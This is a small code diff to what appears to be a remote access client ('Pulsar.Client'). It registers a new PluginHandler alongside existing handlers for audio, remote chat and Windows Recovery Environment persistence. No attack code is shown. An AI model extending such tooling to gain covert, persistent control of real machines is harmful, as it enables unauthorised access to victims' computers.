@@ -268,6 +268,7 @@ namespace Pulsar.Client
             _messageProcessors.Add(new AudioOutputHandler());
             _messageProcessors.Add(new RemoteChatHandler());
             _messageProcessors.Add(new WinREPersistenceHandler());
+            _messageProcessors.Add(new PluginHandler());
 
             foreach (var msgProc in _messageProcessors)
             {
